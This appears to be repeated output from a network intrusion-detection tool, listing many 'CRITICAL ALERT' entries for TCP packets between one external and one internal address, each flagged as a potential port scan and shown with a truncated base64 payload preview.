  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] yeyhz3a1vAxJppUU5Atu68N9F5sh8GKM3YD0edEtTmEnTeTZvA/qeT7HiB6wYZctkZvg/fCWUe64d1ncCjt4WadnN7wklTWqlVt6Y9HVAVHaha2uHu9D/2O+kDqUDJnEC7BTzA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.367575
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] k/sj+0x50hdNe73E5wGDvJF4HfPi1a/CwGnx9JGXU1ucxjRo5JulDJAB8aM1/XxHbFhGjAdGjEGSNY/kgDrffQtxRrsDVOyH+roLUdlVOn7RgTlbeVhJNmC2tu3DhIM8kHFhSA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.368293
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] vwc6UzekH3fF5Y2LieIQOheYM1H7VGdN/4N6Es4nS1v7U/ImU6ssmaVeBdnWRO2cnzauf4RytaVyW7NPnwihpNEmJBU5Io++26NquTVpa7g01JNyzhW9jBXOP7sOVHrJ8sKLQg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.370941
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] MbaE5BvWKNn3LE/UPX7n6NbVtIikDTFQeSCZGKVXGNX1MwCK8KjNB09icHu4dJMC2X0YIUmQs8jmCxkBevX2ctiBQdEjRrwDbpRH4ZVOjdqQnKC0PmWBaOq9SL0MLKutz4qiwA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.371961
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] xunvORWLB0XPNsyzTdQ0kFby4WnU+s7jeYjVs5VozTdLOgssb8RJeik92io0eQKBEawuA6nGR9poJJPiZSLy/obAHH8mefPzN1uVylG2lRvouD8xt8NrQDYKonYaz8mjlvnkPw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.373663
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] ASadRM9v6Mi1PNRsQqgrpaE1nbdV7XbLCMHnen1y1q6W2RTAh/YpwZtJobnTTAHk0Mufb4T9UCfP2P6ZzLTWyj/B/ygUXCaHpoF1DlI3P7IV5MJjh0aJHRVnj/8NplJ9kEWCIg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.375693
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] N0znTBb61YZTPViPWn6vq0MfxEN6Jxl4Q1jzhoKv+H8LxGqY6Gp9G4zoTRqGJrve+The6WBGFX1GUcb9c49gaCFlB6fC/OBrV4asZPrZWpC+ApLdXkvMZCuJSzNAK7YCuMsM6w==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.377139
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 5LSDkXugPFGa2hpol7K2LR0gN0D71qbmvSpiPdvcMebh9ZS/NkktQEf0nPKGDZFo4ZOutwG0vG6EQkdW4+irm5Oib6ucnuJ18Z0Ke18Wkoous4GO7yQ04/bGJ4iWRwVtHZhGrA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.378505
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 2U6kokDh+84YhdLRof3OIGIgJfBEEAbopRva5eSe65Fp8xuazUrRVOGl3bxr0A+SQ83/oNzpeUVE6NUncBpiIjFI6Arw8qxucotbbFLPhZY2tsP/qzC9e5lGBdq7UMk9V1ZUEg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.379434
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] y7SJrecz78DjdB23qA5iRFj0kTB6rN86TdRbYtSUZwLIzrXIePw4XhitZTv/1eGADSr09hxclC9fSMk6glRhe2Xud/xdH1ReckwLW0pR4YcBG35mweZXi3ra61g1xKYaB1iMgw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.380442
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 13Nf3ailouSuJjTgqEkSg7QpXheFppVrJ2MURq8MHEz3T/eaVNfdnVCZpNwqrrA+Jyi0sXALuc/2t7Uw/iOgcG7K4x8Y74HsSIWkrykoyA6+spoe7kwYgJ4Y/I/N+3KVM8v3eA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.381210
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] aJDEoJsHa4s3niuoWoiCItGQxFX6w+ul1UiedZ3ojZItQrKg5eY948LmcpiOhPLUYw0SgujSJHdizswGWgLuPKKzgcsTIV3zOgItmP/+aKmopoQby59VeH9oUQexzFY4SChbuQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.381868
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] gHCxBEZ9/pG1CklIvUXNv0wSxSPFZDHRslRqTO0iqYhOiyLvrexN9Xt3A6YSjuHn4I0jx+QEIbCzdynr1kJXfYW6H4Yj92sONqXXS5r3ni01EQx6M716iz7ANhBsuvU9/yOM+g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.382603
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] WU/wfpB6B0wZyhMevl9v+nmgtQ4s7vW/6XQb9S8RtE/9J+0D0gk5Fweu2gBCSZq32ww3ZfZsHDYhElIwTeciLmKfr6blebKlgOPO4fXKhQAMYvi/IVvaDb+HsSRdQca0A/8QuA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.384694
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] /KeGTnLFbx2J4jW6OtwnPXIES62cp2YK4fIqIfTQU8yan6T6wEIuJQeZBQGloglIeNbSNhyOSNU+4WruXbCUyjEjONp9jdYPLVghvZ92IaFMBjJIi0PsaMQFyeeb35wf+7rVaQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.387200
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] xte3Cwe3+fuGy4j2vxrJLiHkXdbn/BZQWUoOIRucIJg9YRuMson3mQxrPDupPpnKEg/R0GqiFgdweLnDjtDTbOS6Bea/imkVFPhY/ZcahlU0ttQ38fNd+abBFyT4y+FJqu+zYQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.388011
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] EXYiXIG5zgQYTIpuXcelG02ur2le9oXqlFAMw03xfaQqrJLS9BP1Rd5pbZKcZLc1+8IL4/jbKsgWivrB+C6gNxS38vdbBNRR+35s2r/S+pIsZO4ZkFROsjm+ndHMHEzfddJOug==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.389495
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] pBapHDq8az/3U4+fIka+AMZ0UOfskBMRIphok/3MM8Cs0woSVFWhFfm/FGUHMrNZ2gkgPKXtFVbUEsd23NFrcZrokzq3JM5IRBVww+u4SjV8yhtH9HhepGwAQ9NjUyAjIkJA0w==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.391910
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] UYFubmeGcREwiriVkgOJ8Oxg6YiuxDh7hXtZwuW87JvCdCrt+WHZv7URY6z59q9Sxzs4T3W8IKDnZaEaJNwpTfoUu7pr2H72zh2ROjqZuKuT20+0GHUhPR0l6+6dYYc6xp4Uxw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.394065
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] as3l+u14ty9g77MfcXiY+zesG+w4arEyJiK+V+n5/rehhLw+knBs7EcH1MHxdSLatgfuoAPzFm8It4aAnSJlfxeosG8nCKOzzlDCOccEWF0Xwml7fLTnJrv5JpVqbQxIsH6/kw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.396918
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] MjRh6sDnwRrYe9Y7ibXxNYdWp5/smV2cgNB2m+4m5s93ckgu9v++h9747Yl8LuH35y6E8wj9wghpNxWToiahl1Bk5ehstV2nwgLnUBYQJ9UML9tpjaJnNAbVJ9HGybTWusaepQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.397685
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] bHRA6++iRchinM6UCt4lMkcn9Yqrg5PiRYZpBSlxUZcwpJKJVx2s6gIOPJrci93dE2qdo6x5N/XqxeOvNVoGj5Jm8MxHJrLaH9Xi7oJaoKGv2YPCZ9FnFyCq4neWO9oT0sLXmg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.398432
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] Zt+8oHpzlYmifn+J0Ddiq7SZHXGOQkR/G+MHiwXjB3yJhMlZGd6oDbtiFkBp3RdpBUyGwvIPFd26VGpkHTBLJ0w6IdQwyRiC5x6Lz30p7tcvGvQyMzDLwCPx4KyeqxNO3W/Itw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.400078
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] MVfVjEO5/c2rMr3/2C4xTG8lWByo2nKbVwXPzqoyDysKGYvZiZ2DlU3lWF3/xM79h9RrKuvD062Hr7AmvXL5AMSAZrm2CixY/zJFVwZjPvLtIsZeHVMSPM1dn2cJeKkFYUKytQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.402124
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] ehoo6ZkjCNThJ+++GOorOyMcB5xhy5VcR1XoqqxKGqaYYed8Nlb/eT7fNHxZLhjU+iAZXIw6vP5F3q1pgx7oMUMuoB0SpSsf1sS1ilwJagOI7wkpDtD9Cr0W0guV6CgIoJUvrA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.403452
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 46anYIwJ/bWdxJ187dImmZ+7pFcNAgqIXGDkmEwfunIYDD+C0IZgR+CJHp3O1H3gJULRBUcdF+HSXfo2Q7e3rZat/syzXFYJC4RTScozVw65O9QIzBzGfGygOdevRSnCqVoqRg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.404729
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] w7i00bTxcd3PYak0oaFgspRIteH2/EM1yZgst/hZZFySpXLji9P/i8gMCIk8kAT3HkOYvyGlSZm9kjCnKinhBCGNsvtEQGDieVEDpSmPsDzgmQ+dDl7DbXT7zjiWY5OXfuJMZA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.409041
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] dw1lV4Xx5sebnp3lMjXr/BZQfEeeWdYg/ToVDyjX9FRs40il5QH26cuqrFP4OClK/B5pMMkxr4+uFkfRHKtEPERHhg7e6pTScMMm0CorUwjyoViQswkrzLqzkqH8V9paSb1w7Q==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.411496
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 0PakMWCCP5a6idPf9LBSRAJfFa9x6T0rhoEyzBvNQDlW+4+z3TsQ7a2WHCd0XB3MUTkT9Wx1C+MMkJ1Aoe8VQXQTzAm+PXY/V35fTsuja+KVAy4vPfPFJcyJL6QXO5I5nbxGKg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.412890
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] uOUXt7QNyvXSzqj9AQfZxcAt0qTXLeyFHvmwtThng/dhGtu1Pd6HBqrL5i4hfodMXVwjPtucwCWIt077t9wH1Q/ETs4Qwq2uWHK3/fba+Nk3Jj1r0WxThUnyPd/HdEftaLGZYw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.414168
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 93qd5485ECaVFpHW1HZMQFn2DErmuhk0Pg9CFmwM68UarIzACajNwy3EY/KcBbEz7bfpRXfhjFuMo/GwSUKrAxTGKc4H1TT4O8Fmf0StFX3rrzd6X9zjcUb8HTvsjXpRuRkm1Q==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.415547
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] IkS1ROd/2mOOUcAEaZryfprql+hNia0TT3hO6JEnL5SS57PFUik6z42NFNN6fzkhf3Usu7WhWPkJhqt/8O//HWBdtWMVGgYpoQZAquYhfRSyueyMzE0ndxNNs2wU2OG+24MaYw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.418427
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 4N0Lz8tkfjODC8pbQ37WnS9RCrVs54dv7FlTmZpMOU8zWyfAtdjNL7DqZtUUxqkqUE6iJUAqUVoVBK4jojgVpYXEvA3/MYtZ+uC58bGMI6CNJsci4GjTH620vwiO6XWZ1qUT4g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.419652
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] M7TNvS2sHDqR+avsIgo+bfvJriefRgHG64Wce11ei5xBCA4y/kOevcJ+9Ap077jCyE+ynGNREM3LGuDmEx+WMcs6VdTfO2BfjDrF61ZxOfCNJDj0ci5jHhLJVrm4loAa25LaTA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.420967
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 9F/uRGP6Ls9sLZc290t+YMVica/HI1cPTgfldbUu0GE58ZKCILoI42dy1mh52331ZBYWuTwpkpZbr/h54U9jmOyYpdjjhZuuWfB4MJgyhOPbolBWKrxwS4pFU7KTfZkzly4OpA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.424045
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 8YMClLLvRHF3Qa5+I8ErcdTZm5+QovSwJpCz2ZCcUAnuA4lsjsLEOKKU3Bfmyo4aEoYbQ0Xeh4tDUufJ8XXLWTEkEMl1ZEPt5RIpMpB0YqR0PVuT2YsRk5i7KTBp962jv80B0w==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.426434
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] G2CRdcvNKNbYFPQ2oCUXs0niPy8LN103K4UCppsXoc2SxvbxToYoWAXl44gcAdm/pn1fxUqzC40kVMGZpPn+0YCYV77pAZP3+WmKmXwdeKd0vXtzPxaeVi4QaHvyW+oQ1wu7Ow==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.428480
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] +piqyBQLInZH3WWjwKydvmErcdMdVDCGtOR88s8HTsWN31JavLJTq9R1YP3dzS9Q5Ib1AY4PmyvBaYaRvbBWP2DkF+QjjvwwFQCV3qWUyIKW/kPjrx9TtxvZtGIVn7aqFFAVtw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.431877
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 1VS5LWuzVP3+NCx3R4Z3FoKsMOsp5+FXHDEh17TYkL5/Q31LmnKa/5Z7tUoo8cyZm8jN+Z9JTiaN5Jgmer2QH4z9F7mYcyCUCPTl8Cv6/bNFGlyUyKQshbAv2qVHMq0f/xYsRA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.435937
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] niP7C0NGy6teE1CwxWrZsjS9dyGaJ4nWFM2Wo5qJ1sPlbA+nIafz8LkcXt+wsCuu0ctrgGIjrfbOuPd6/Ep73d+H4XJ2E4v0C+6jq9rIThfufTUKSp/RvucGGlfa9PbTVcoOwg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.437808
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 7ff+CKnrROrksCqbErCnMfmhp4MzFFMbvY+UsEc3KaEZ0u3tPQnO0PG0YjpqW1ZoR7a3zWpBJf4+pfBaJNlJ350HKfVFhSNZ2W6a6rsrj8RpoLpG3LfENTifhxQd5Bfs5YzeUg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.440342
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] obTQ+V52xejlWgb2ZMb6mlU5Mbu+8WDwGm/67uWzHNdM0TfhbHqr8GN9FMGrDzVEZK8DQGTdDVv/wFzxQBmBluCg3xWpJogDgFWID4x3LonZXNeF8DUaDAzM9Vttp3lpn8+f6Q==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.441871
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] RAtqCbRgf3+4ifBMuLGoGjFWKoPuqZVc8vzSh86bCFhMLxFeCEA8P/tpJpZyJqCPL4LeH4osKpTD9mCoRPCaZRLP703KJiRkrsQOLD02phTCKaS6xmbt0TavQJrFTRTeZ2scvw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.443070
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] JRnk0ts4fu8MPYr3zlSAnGyBrMGrjsg3csHWCMmu9oCGviHgqruv18ahxBNAL0M/BD0zDg8a64JwFQ2m8ywOZmQwZRu4mDxU7ggYVXtiLb2TSxS+58OjTEcflwSzfP3aj02XoQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.444710
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] t9mG3ryB/lpobN8BIMhGCXB4MzAI3ZNIGFBky00Ksz2MRv07wJ8cl/BEKFZAOHVx/3rJoDTVcvry4c2uyoAh/6XbSFZCXlhspVEke8WqN85wOPLeiIDvaxYqt2Qzm57Bsy/VqA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.446523
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] OV1FArwyVoLT4fV4FNvZNkPOfhcj7xKkWTx1WQaglxeUKGtKxUx4XmJuVGmk0P4AoMd7lnDw00RnKs6V1moJ5IBcD43WmSQLTtqyws5pX7OKAaKGu0+1xLUXGPcSD/YzXMpp1A==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.449011
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] rVqI2oL9lDhkhQQXl1SS8cyq28YnVU1u8XaFNYdnqLqawYFVCRhJVecNAMdR3UHbZgLQkLqgwi5OWGzZXhw5S4fzCsv244YbmiPn7BXoSZCPFJ4I25UFL1ipASYDyb8B+yrRiA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.450190
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] +8IhQxTi9uaH8U+zzAgu6RcDAQAgQDni7fgDT84XvlGBsg+lVkH+x4CB+AnK+nu/ZTw7ZCoXAwE/0F9D5SSR5icHkybOVoPQiM/kROzui0kH0Bzddi1r8vedP4VM6V2hDqTtlQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.451357
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] JuL6KV0Y6hMRt7FiGTnVLthr8S/QHJTHtdURonxnHdAiOB3slC8i40iJzJ9UU3r9q6bIcG5Kf585mN1FELHeJp9Oyr6em4KU6ScnCMnAoJArB1zOTgba8ByJ3q7Buds1eJiJOQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.452267
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] jziWP2zshEC2G+iLr1M2im4bSLawUxZ+ULVuvSP8LAUVpQEczm9yQOyYcpppCPCbz5O3sXN2RXgnP+n8amF8MWfY2jAUWc8rXRVzA8v31/Rk6oE8Rettmec3cFP7WdbaZuEgdg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.453796
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] Tbd2TijU0VxMrTR1ec59y2yVQYKZyUtiYFDceBtXwc6mmik/xEs7GuKkj/n1WYCqFy4npBYYidn9YKEv01BLRpBhP7aL8Cx3r3Ij+/Z00qpG6VoY8iJBEa0YB/5XJM13hRk8WQ==...
==================================================

